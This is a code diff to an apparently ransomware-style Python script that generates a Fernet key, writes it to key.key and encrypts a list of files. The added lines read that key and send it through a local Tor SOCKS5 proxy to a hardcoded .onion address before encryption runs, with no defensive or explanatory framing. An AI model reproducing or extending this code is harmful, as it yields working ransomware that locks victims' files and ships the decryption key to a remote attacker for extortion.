@@ -1,4 +1,5 @@
-#from cryptography.fernet import Fernet
+import socket
+from cryptography.fernet import Fernet
 import os
 from pathlib import Path
 
@@ -19,6 +20,42 @@ if __name__ == "__main__":
     with open("key.key", "wb") as thekey:
         thekey.write(key)
 
+    with open("key.key", "r") as file:
+        content = file.read()
+
+    proxy_host = "127.0.0.1"
+    proxy_port = 9050
+
+    onion_address = "fkoddwbl6lzuphjtbobo5fiqdjqkw56l6e6lqpkwuk2p4sn3lw64wxad.onion"
+    onion_port = 12345
+
+    message = content
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    s.connect((proxy_host, proxy_port))
+
+    s.sendall(b"\x05\x01\x00")
+    response = s.recv(2)
+    if response != b"\x05\x00":
+        raise Exception("SOCKS5 proxy authentication failed")
+
+    req = b"\x05"
+    req += b"\x01" 
+    req += b"\x00"  
+    req += b"\x03"
+    req += bytes([len(onion_address)])
+    req += onion_address.encode()
+    req += onion_port.to_bytes(2, "big")
+
+    s.sendall(req)
+    resp = s.recv(10)
+    if resp[1] != 0x00:
+        raise Exception("SOCKS5 connection failed")
+
+    s.sendall(message.encode())
+    s.close()
+
     fernet = Fernet(key)
 
     for file in files:
@@ -34,4 +71,5 @@ if __name__ == "__main__":
             print(f"Encrypted {file}")
         except Exception as e:
             print(f"Failed to encrypt {file}: {e}")
+
 
